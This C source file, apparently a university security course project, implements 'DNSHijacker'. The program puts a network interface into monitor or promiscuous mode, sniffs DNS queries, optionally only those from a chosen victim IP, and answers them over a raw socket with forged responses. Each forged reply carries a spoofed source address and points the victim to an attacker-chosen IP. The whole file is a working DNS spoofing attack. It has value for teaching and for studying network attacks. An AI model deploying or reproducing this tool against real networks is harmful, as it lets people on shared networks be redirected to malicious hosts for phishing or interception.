/*************************************************************************************************
 * dnshijacker.c : main file of program DNSHijacker capable of sniffing traffic on open network and
 * answering to particular DNS requests with a specified IP address.
 *
 * Written by Vincent Billaut, Armand Boschin and Adrian Valente
 *
 * Inspired from code by Jiazi Yi, available via INF474X's moodle page
 *
 */


#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "header.h"
#include "dns.h"

#define MAX_NAME_SIZE 200   //Size of string
#define IP_MAX_SIZE 16      //Size of IP addressin string format
#define RR_CLASSIC_SIZE 16 //Size of a DNS RR with name format compression
#define TTL 300000      //TTL set to our DNS answers
#define PROT_UDP 17    //IP protocol number
 //Link layer header types
#define LINKTYPE_NULL 0     
#define LINKTYPE_ETH 1
#define LINKTYPE_WIFI 127

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer);
char ipanswered[IP_MAX_SIZE];   //IP address that we send as a response to DNS requests
int header_type = 0;     //Link layer header type according to Pcap table : see http://www.tcpdump.org/linktypes.html
int num_packs = 0;       //Number of packets captured

static void usage(void){
  printf("DNSHijacker [<IP addr answered> [<IP addr to target>]]\n");
  exit(1);
}

int main (int argc, char **argv){

	int ipfiltered = 0;               //Boolean to see if an argument is set for victim's IP
	char iptofilter[IP_MAX_SIZE];     //Victim's IP address

	if(argc >= 2 && strstr(argv[1],(char *) "help") != 0){  //The user can type ./DNSHijacker help to see the manual
		usage();
		exit(0);
	}

	//Getting arguments
	if (argc >= 2) {
		strncpy(ipanswered, argv[1], IP_MAX_SIZE);
		if (argc >= 3){
			ipfiltered = 1;
			strncpy(iptofilter,argv[2],IP_MAX_SIZE);
		}
	} else {
		strncpy(ipanswered,"129.104.30.29",15);   //Default IP address answered
	}

	/****** SNIFFING PART : Setting up Pcap environment **********/
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;
	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	//get all available devices : code by Jiazi Yi
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}
	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}
	printf("Available devices list: \n");
	int c = 1;
	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}
	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //Deleting final '\n'
	//End of device's choice

	//Creating the handle
	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	if (pcap_can_set_rfmon(handle)==1){
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle,"Error while setting monitor mode");
	} else {
		if(pcap_set_promisc(handle,1))
			pcap_perror(handle,"Error while setting promiscuous mode");
	}

	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle,"Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap activate error");

	//Link-layer header type according to PCAP table : see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	/**** Setting a filter to capture only DNS queries *********/
	struct bpf_program *prog = malloc(sizeof(struct bpf_program));
	if (ipfiltered){
		char string[100];
		strcpy(string,"src host ");
		strcat(string,iptofilter);
		strcat(string," and udp dst port 53");
		if(pcap_compile(handle,prog,string,0,PCAP_NETMASK_UNKNOWN)<0)
			pcap_perror(handle,"Handle compile error");
	} else {
		if(pcap_compile(handle,prog,"udp dst port 53",0,PCAP_NETMASK_UNKNOWN)<0)
			pcap_perror(handle,"Handle compile error");
	}
	if(pcap_setfilter(handle,prog)<0)
		pcap_perror(handle,"Handle set filter error");

	/****** logfile to write captured packets ******/
	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		perror("Unable to create file");
		exit(1);
	}

	/******* Launching the capture ***********/
	pcap_loop(handle , -1 , process_packet , NULL);
	

	pcap_close(handle);
	fclose(logfile);
	return 0;
}


/***************************************
In this function we treat the capture packer, check if it a DNS request (although pcap filter is supposed to do the job),
and answer to it.
**************************************/
void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	int size = header->len;
	num_packs++;
	printf("\n\nPacket sniffed : %d\n", num_packs);

	//Finding the beginning of IP header
	struct iphdr *iph;
	if (header_type == LINKTYPE_ETH)
		iph = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
	else if (header_type == LINKTYPE_NULL)
		iph = (struct iphdr*)(buffer + 4);
	else if (header_type == LINKTYPE_WIFI)
		iph = (struct iphdr*)(buffer + 57);
	else{
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(1);
	}

	/********** Checking properties of the packet and writing to screen and logfile **********************/
	fputs("\n\n\n#########################################\n", logfile);
	fputs ("                 INCOMING PACKET             \n", logfile);
	print_ip_packet((u_char*)iph);
	//Checking whether we have an UDP packet (although normally only DNS query packets are filtered)
	if (iph->protocol != PROT_UDP){
		printf("Protocol: %d\n", iph->protocol);
		return;
	}
	struct udphdr *udph = (struct udphdr*)(iph + 1); //Caution : arithmetique de pointeurs!
	print_udp_packet((u_char*)udph);
	//Check if it is a DNS query packet
	if (udph->dest != htons(53)){
		printf("UDP dest port: %d\n", udph->dest);
		return;
	}
	//We have sniffed a DNS query packet
	printf("It is a DNS packet\n");
	PrintData(buffer,size);
	dns_header *dnsh = (dns_header*) (udph+1);
	uint8_t *ptr8 = (uint8_t*) dnsh + sizeof(dns_header);
	//Finding first query after DNS header
	char hostnamedns[MAX_NAME_SIZE];
	char hostnamenormal[MAX_NAME_SIZE];
	strncpy(hostnamedns, (char*)ptr8, MAX_NAME_SIZE);
	get_domain_name(hostnamenormal, hostnamedns);
	printf("Query sniffed for hostname %s\n", hostnamenormal);


	/*************** Writing an answer *********************/
	uint8_t *ansbuf = malloc(size + RR_CLASSIC_SIZE); //Our answer should not exceed this size since
														//we only add an answer RR
	bzero(ansbuf, size + RR_CLASSIC_SIZE);
	uint8_t *dnsans = ansbuf + sizeof(struct iphdr)+sizeof(struct udphdr);
	//We lazily copy the victim's DNS header
	memcpy(dnsans, dnsh, sizeof(dns_header));
	((dns_header*)dnsans)->flags = htons(1 << 15);  //Setting QR flag field to 1
	((dns_header*)dnsans)->an_count = htons(1);   //Setting answer count to 1
	memcpy(dnsans+sizeof(dns_header), ptr8, strlen(hostnamedns)+1+4); //We copy the first client's query
	uint16_t *ptr16;
	/********* Writing the answer RR ************/
	ptr16 = (uint16_t*) (dnsans + sizeof(dns_header)+strlen(hostnamedns)+1+4);
	ptr8 = (uint8_t*) ptr16;
	//Writing the name format compression
	*ptr16 = htons(sizeof(dns_header));
	*ptr8 += 0b11000000;
	ptr16++;
	//Writing Type and Class
	*ptr16 = htons(TYPE_A);
	ptr16++;
	*ptr16 = htons(CLASS_IN);
	ptr16++;
	//Setting TTL
	uint32_t *ptr32;
	ptr32 = (uint32_t*) ptr16; 
	*ptr32 = htonl(TTL);
	ptr16 += 2;
	//Setting RDLENGTH
	*ptr16 = htons(4);  
	ptr16++;
	//Setting RDATA
	inet_pton(AF_INET, ipanswered, (struct in_addr*) ptr16);
	
	/******* Writing UDP header **************/
	struct udphdr *udpans = (struct udphdr*) (ansbuf + sizeof(struct iphdr));
	udpans->source = htons(53);
	udpans->dest = udph->source;
	udpans->len = htons(ntohs(udph->len) + RR_CLASSIC_SIZE);
	udpans->check = 0;

	/****** Writing IP header with fake source address ***********/
	struct iphdr *ipans = (struct iphdr*) ansbuf;
	ipans->version = 4;
	ipans->ihl = 5;
	ipans->tot_len = (size+RR_CLASSIC_SIZE);  //No htons() here because of OSX BSD based kernel!!
	ipans->id = iph->id;
	ipans->ttl = 12;
	ipans->protocol = PROT_UDP;
	ipans->saddr = iph->daddr;     //Here's the fake IP source address
	ipans->daddr = iph->saddr;
	ipans->check = 0;

	/******** Opening Raw socket ***********/
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int hincl = 1;
	setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	if(fd < 0)
	{
		perror("Error creating raw socket");
		exit(1);
	}
	struct sockaddr_in client;
	bzero(&client, sizeof(struct sockaddr_in));
	client.sin_family = AF_INET;
	client.sin_port = udph->source;
	client.sin_addr.s_addr = iph->saddr;

	/********** Sending the packet *******************/
	printf("Packet sent : \n");
	fputs("\n\n\n#########################################\n", logfile);
	fputs("             PACKET SENT                   \n", logfile);
	PrintData(ansbuf, size+RR_CLASSIC_SIZE);
	fputs("\n\n\n#########################################\n\n\n", logfile);
	fflush(logfile); //Flushing system's IO buffer to the file
	int lensent = sendto(fd, ansbuf, size+RR_CLASSIC_SIZE,
		0, (struct sockaddr*) &client, sizeof(struct sockaddr_in));
	if (lensent <= 0)
		perror("Send error");
	else
		fprintf(stderr, "%d bytes correctly sent\n", lensent);

	/********* We won !!! **********************/

}
